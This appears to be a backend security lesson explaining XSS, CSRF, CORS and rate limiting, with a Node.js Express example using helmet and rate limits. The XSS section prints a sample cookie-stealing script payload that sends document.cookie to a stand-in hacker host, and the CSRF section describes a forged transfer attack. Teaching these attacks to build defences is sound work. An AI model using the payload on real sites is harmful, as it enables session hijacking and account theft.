## 1. Introduction

**What is this lesson?**
In this lesson, we will learn how to defend your backend API from malicious attacks. We will cover the holy trinity of web vulnerabilities (XSS, CSRF, and CORS) and learn how to stop hackers from crashing your server using Rate Limiting.

**Why are we learning it?**
If you put an unprotected API on the internet, it will be scanned by automated hacker bots within 5 minutes. If your API isn't secured, they will steal your users' data, brute-force your passwords, and run up a $50,000 AWS bill.

**Why should a backend engineer know this?**
As a backend engineer, you are the last line of defense. The frontend cannot be trusted, because hackers can easily bypass React and send HTTP requests directly to your Node.js server using tools like Postman or `curl`.

---

## 2. Why This Exists

**What problem existed before?**
In the early 2000s, websites were incredibly vulnerable. A hacker could leave a comment on a blog containing malicious JavaScript. When you read the blog, the script would execute in *your* browser, steal your Session Cookie, and send it to the hacker. The hacker could then log into your bank account!

**Why was this technology created?**
To stop these attacks, browser vendors (like Google and Mozilla) and backend engineers collaborated to invent security headers (like CORS and CSP) and architectural patterns (like Rate Limiting) to physically block malicious behavior at the network level.

**How did companies solve this problem?**
Instead of trusting the internet, companies adopted a **"Zero Trust"** policy. The backend now assumes every single incoming request is a hacker until mathematically proven otherwise.

---

## 3. Problems It Solves

**Without Rate Limiting, your server will die.**
A hacker can write a 3-line Python script that sends 10,000 requests per second to your `/login` route. Your database will overheat trying to check the passwords, and your entire application will crash. This is called a DDoS attack.

**Without CORS, any website can steal your data.**
If you are logged into your bank, and you accidentally visit `evil-hacker.com`, that evil website could run JavaScript in the background to silently request `GET https://mybank.com/balance`. Without CORS, the browser would allow it!

## 6. Step-by-Step Explanation

Let's break down the three most common attacks and exactly how backend engineers stop them.

**1. XSS (Cross-Site Scripting)**
↓
**The Attack:** A hacker writes `<script>fetch('hacker.com?cookie=' + document.cookie)</script>` as their username. When you view their profile, the script runs in your browser and steals your session cookie!
**The Defense:** 
- Frontend: React automatically escapes HTML, making this hard.
- Backend: NEVER store JWTs or Session IDs in `localStorage`. Store them in `HttpOnly` Cookies, which JavaScript is physically blocked from reading!

**2. CSRF (Cross-Site Request Forgery)**
↓
**The Attack:** You are logged into your bank. You visit `hacker.com`. The hacker has a hidden form on their site that submits a `POST` request to `mybank.com/transfer?amount=1000`. Because you are already logged into the bank, your browser automatically attaches your Bank Cookie to the request, and the money is stolen!
**The Defense:** 
- Backend: Configure cookies with `SameSite=Strict`. This tells the browser: "Only send this cookie if the user is actually clicking a button on the real `mybank.com` website."

**3. CORS (Cross-Origin Resource Sharing)**
↓
**The Attack:** `hacker.com` uses `fetch()` to request data from `api.mybank.com`.
**The Defense:** 
- Backend: The API sends a header saying `Access-Control-Allow-Origin: https://mybank.com`. The victim's browser sees this and says, "Wait, I am currently on `hacker.com`, but this API only allows `mybank.com`. I will block the hacker from seeing the response!"

## 7. Deep Explanation: Rate Limiting

<ConceptBlock type="info" title="How Rate Limiting Works">
  When a request hits your API, you extract the user's IP Address (e.g., `192.168.1.55`).
  
  You store a counter in a fast, in-memory database like **Redis**. 
  `IP: 192.168.1.55 | Count: 1 | ResetTime: 1 minute`.

  Every time they make a request, you increment the counter. If the counter hits 100 before the minute is up, you immediately return a **429 Too Many Requests** status code and drop the connection, saving your primary database from doing any work!
</ConceptBlock>

## 8. Node.js Implementation

Let's secure a Node.js Express API. We will configure CORS so only our real frontend can talk to it, and we will add Rate Limiting to stop hackers from brute-forcing passwords.

<CodeTabs>
  <div label="secure-server.js (Node.js)">
    ```javascript
    const express = require('express');
    const cors = require('cors');
    const rateLimit = require('express-rate-limit');
    const helmet = require('helmet');

    const app = express();

    // 1. HELMET: Automatically adds 14 security headers to stop XSS and clickjacking
    app.use(helmet());

    // 2. CORS: Only allow requests from our official React frontend!
    const corsOptions = {
      origin: 'https://www.quizkaal.com', // No other website can fetch our data!
      optionsSuccessStatus: 200
    };
    app.use(cors(corsOptions));

    // 3. RATE LIMITING: Stop DDoS and Brute Force attacks
    // Limit each IP address to 100 requests per 15 minutes
    const globalLimiter = rateLimit({
      windowMs: 15 * 60 * 1000, // 15 minutes
      max: 100, // limit each IP to 100 requests per windowMs
      message: { error: 'Too many requests, please try again in 15 minutes.' }
    });
    
    // Apply the global limiter to all routes
    app.use(globalLimiter);

    // 4. STRICT RATE LIMITING: Protect sensitive routes!
    // Limit login attempts to 5 per 15 minutes to stop password brute-forcing
    const loginLimiter = rateLimit({
      windowMs: 15 * 60 * 1000,
      max: 5,
      message: { error: 'Too many login attempts. Account locked for 15 minutes.' }
    });

    app.post('/api/login', loginLimiter, (req, res) => {
      // If they get here, they haven't exceeded the limit yet.
      res.json({ message: 'Checking password...' });
    });

    app.get('/api/data', (req, res) => {
      res.json({ secretData: 'This is protected by CORS and Rate Limiting!' });
    });

    app.listen(3000, () => console.log('Secure API running on Port 3000'));
    ```
  </div>
</CodeTabs>

**Expected Output (If a hacker hits the login route 6 times in a row):**
```json
// Status Code: 429 Too Many Requests
{
  "error": "Too many login attempts. Account locked for 15 minutes."
}
```

## 10. Common Mistakes

<WarningCard title="Configuring CORS with '*'">
  **The Mistake:** Writing `app.use(cors({ origin: '*' }))` in production.

  **Why it happens:** When developers build their frontend locally (on `localhost:3000`) and their backend locally (on `localhost:8080`), they get CORS errors. To fix it quickly, they use `*` (allow everything) and forget to remove it before deploying.

  **The Fix:** NEVER use `*` in production for an authenticated API. It literally disables the CORS security feature, allowing any evil website on the internet to make requests to your API on behalf of your users. Always hardcode your exact frontend URL (e.g., `origin: 'https://mywebsite.com'`).
</WarningCard>

## 11. Best Practices

**Distributed Rate Limiting:**
If you have 5 backend Node.js servers, you cannot store the Rate Limit counter in the server's RAM. If a hacker hits Server A 5 times, then Server B 5 times, they bypass the limit! 
In enterprise apps, backend engineers configure `express-rate-limit` to store the counters in a centralized **Redis** database. That way, all 5 servers share the exact same count!

**Content Security Policy (CSP):**
Use the `helmet` package to inject a CSP header. This header tells the browser: "Only allow JavaScript to execute if it was downloaded from `mywebsite.com`. If you see inline `<script>` tags, block them immediately!" This completely destroys XSS attacks.

## 14. Summary

*   **XSS:** Hackers injecting malicious JavaScript. Blocked by `HttpOnly` cookies and CSP.
*   **CSRF:** Hackers forging requests from other sites. Blocked by `SameSite` cookies.
*   **CORS:** Blocks websites from fetching data from APIs they don't own. 
*   **Rate Limiting:** Protects your database from DDoS and Brute Force attacks by cutting off IPs that make too many requests.
